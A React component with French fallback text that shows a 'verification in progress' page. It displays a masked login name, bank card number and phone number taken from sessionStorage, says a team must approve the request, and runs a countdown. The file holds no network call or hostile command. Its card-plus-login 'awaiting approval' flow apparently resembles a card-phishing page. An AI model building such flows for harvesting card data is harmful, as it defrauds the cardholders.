import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../hooks/useLanguage';
import './NextStepAppr.css';

function NextStepAppr() {
  const navigate = useNavigate();
  const { t } = useLanguage();
  
  const [userData, setUserData] = useState({
    loginName: '',
    cardNumber: '',
    phoneNumber: '',
    sessionId: ''
  });
  
  const [countdown, setCountdown] = useState(5);
  
  useEffect(() => {
    // Récupérer les données stockées
    const loginName = sessionStorage.getItem('loginName');
    const cardNumber = sessionStorage.getItem('cardNumber');
    const phoneNumber = sessionStorage.getItem('phoneNumber');
    const sessionId = sessionStorage.getItem('sessionId');
    
    if (loginName && cardNumber && phoneNumber && sessionId) {
      setUserData({
        loginName,
        cardNumber: maskCardNumber(cardNumber),
        phoneNumber: maskPhoneNumber(phoneNumber),
        sessionId
      });
    }
    
    // Démarrer le compte à rebours
    const timer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);
  
  const maskCardNumber = (cardNumber) => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    if (cleanNumber.length >= 16) {
      return `**** **** **** ${cleanNumber.slice(-4)}`;
    }
    return cardNumber;
  };
  
  const maskPhoneNumber = (phoneNumber) => {
    if (phoneNumber.length >= 9) {
      return `${phoneNumber.slice(0, 3)}***${phoneNumber.slice(-3)}`;
    }
    return phoneNumber;
  };
  
  const handleContinue = () => {
    // Rediriger vers la page principale ou terminer le processus
    window.location.reload();
  };
  
  const handleCancel = () => {
    // Nettoyer les données et revenir à l'accueil
    sessionStorage.clear();
    navigate('/');
  };
  
  return (
    <div className="nextstepappr-container">
      <div className="nextstepappr-card">
        <div className="nextstepappr-header">
          <div className="nextstepappr-icon">✅</div>
          <h2>{t.nextStepTitle || 'Vérification en Cours'}</h2>
        </div>
        
        <div className="nextstepappr-content">
          <p className="nextstepappr-message">
            {t.nextStepMessage || 'Votre demande est en cours de traitement par notre équipe.'}
          </p>
          
          <div className="nextstepappr-info">
            <div className="info-row">
              <span className="info-label">{t.username || 'Utilisateur'}:</span>
              <span className="info-value">{userData.loginName}</span>
            </div>
            <div className="info-row">
              <span className="info-label">{t.cardNumber || 'Carte'}:</span>
              <span className="info-value">{userData.cardNumber}</span>
            </div>
            <div className="info-row">
              <span className="info-label">{t.phoneNumber || 'Téléphone'}:</span>
              <span className="info-value">{userData.phoneNumber}</span>
            </div>
          </div>
          
          <div className="nextstepappr-status">
            <div className="status-indicator">
              <div className="status-dot"></div>
              <span>{t.waitingForApproval || 'En attente d\'approbation...'}</span>
            </div>
          </div>
          
          <div className="nextstepappr-timer">
            <p>{t.redirectMessage || 'Redirection automatique dans'}</p>
            <div className="timer-circle">
              <span className="timer-number">{countdown}</span>
            </div>
            <p className="timer-text">{t.seconds || 'secondes'}</p>
          </div>
        </div>
        
        <div className="nextstepappr-buttons">
          <button 
            className="nextstepappr-btn cancel-btn"
            onClick={handleCancel}
          >
            {t.cancel || 'Annuler'}
          </button>
          <button 
            className="nextstepappr-btn continue-btn"
            onClick={handleContinue}
          >
            {t.continue || 'Continuer'}
          </button>
        </div>
      </div>
    </div>
  );
}

export default NextStepAppr;